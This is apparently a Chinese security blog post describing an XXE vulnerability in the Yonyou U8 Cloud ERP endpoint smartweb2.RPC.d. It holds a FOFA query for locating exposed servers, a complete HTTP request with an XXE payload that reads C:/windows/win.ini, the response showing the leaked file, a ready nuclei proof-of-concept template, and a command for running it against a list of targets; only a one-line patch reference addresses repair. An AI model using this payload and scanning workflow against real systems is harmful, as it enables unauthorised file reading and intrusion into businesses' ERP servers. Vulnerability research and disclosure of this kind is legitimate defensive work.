#  用友U8 Cloud smartweb2.RPC.d xxe漏洞   
原创 fgz  AI与网安   2024-02-25 07:27  
  
免  
责  
申  
明  
：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**  
  
****  
**先介绍下什么是XXE漏洞？**  
  
  
    XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。  
  
　　XXE漏洞是针对使用XML交互的Web应用程序的攻击方法，在XXE漏洞的基础上，发展出了Blind XXE漏洞。目前来看，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛，此外，网上有一些在线XML格式化工具也存在过问题。  
  
  
  
01  
  
—  
  
漏洞名称  
  
  
  
用友U8 Cloud smartweb2.RPC.d xxe漏洞  
  
  
  
  
02  
  
—  
  
漏洞影响  
  
  
用友U8 Cloud  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPxe8zs6eN3AwnSibNIoPrY5HeJGiacrWwQHrpCvSkQQz234SlR61TJyKY4aHDEcibBkkibyTrYo6bvHA/640?wx_fmt=png&from=appmsg "")  
  
  
  
03  
  
—  
  
漏洞描述  
  
  
用友U8 cloud 聚焦成长型、创新型企业的云 ERP，基于全新的企业互联网应用设计理念，为企业提供集人财物客、产供销于一体的云 ERP 整体解决方案，全面支持多组织业务协同、智能财务，人力服务、构建产业链智造平台，融合用友云服务实现企业互联网资源连接、共享、协同。该系统/hrss/dorado/smartweb2.RPC.d接口存在XXE漏洞，攻击者可以在xml中构造恶意命令，  
造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。  
  
  
04  
  
—  
  
FOFA搜索语句  
  
```
app="用友-U8-Cloud"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPxe8zs6eN3AwnSibNIoPrY5PRB52YzIicBBh1qWkOuojmvG9qSicVJ5eicpTibbMHBNiaC2GgTsV0tHicIg/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
  
向靶场发送如下数据包，查看  
C:/windows/win.ini文件  
```
POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1
Host: 192.168.40.131:8088
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25
Content-Length: 260
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM "file:///C://windows//win.ini" >]><rpc transaction="10" method="resetPwd"><vps><p name="__profileKeys">%26Password;</p ></vps></rpc>
```  
  
  
响应内容如下  
```
HTTP/1.1 200
Connection: close
Transfer-Encoding: chunked
Content-Encoding: gzip
Content-Type: text/xml
Date: Mon, 08 Jan 2024 03:01:36 GMT
Set-Cookie: JSESSIONID=F8DDC953199005CDEA9538451210E68E.server; Path=/hrss; HttpOnly

<?xml version="1.0"?>
<result succeed="false" >
<errorMessage></errorMessage>
<stackTrace><![CDATA[]]></stackTrace>
<viewProperties><p name="__profileKeys" value="; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
" dataType="0" /></viewProperties>
</result>
```  
  
  
响应数据包中含有  
C:/  
windows/  
win.ini文件内容，漏洞复现成功  
  
  
  
  
06  
  
—  
  
nuclei poc  
  
  
poc文件内容如下  
```
id: yonyou-u8-cloud-smartweb2-xxe

info:
  name: 用友U8-Cloud smartweb2.RPC.d XXE漏洞
  author: fgz
  severity: critical
  description: 用友U8 cloud 聚焦成长型、创新型企业的云 ERP，基于全新的企业互联网应用设计理念，为企业提供集人财物客、产供销于一体的云 ERP 整体解决方案，全面支持多组织业务协同、智能财务，人力服务、构建产业链智造平台，融合用友云服务实现企业互联网资源连接、共享、协同。该系统/hrss/dorado/smartweb2.RPC.d接口存在XXE漏洞，攻击者可以在xml中构造恶意命令，会导致服务器数据泄露以及被远控。
  metadata:
    max-request: 1
    fofa-query: app="用友-U8-Cloud"
    verified: true
requests:
  - raw:
      - |+
        POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        
        __viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM "file:///C://windows//win.ini" >]><rpc transaction="10" method="resetPwd"><vps><p name="__profileKeys">%26Password;</p ></vps></rpc>

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body, 'for 16-bit app')"
```  
  
  
运行POC  
```
nuclei.exe -t mypoc/用友/yonyou-u8-cloud-smartweb2-xxe.yaml -l data/用友-U8-Cloud.txt
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPxe8zs6eN3AwnSibNIoPrY5MYv3jdXMbpjTQqsGbQNViahZyGCr4p9HDGoZMYBiajp8kCV3J5IWpLkw/640?wx_fmt=png&from=appmsg "")  
  
  
07  
  
—  
  
修复建议  
  
  
用友安全中心已经发布安全补丁，参考官方信息进行漏洞修复。  
  
https://security.yonyou.com/#/patchList  
  
  
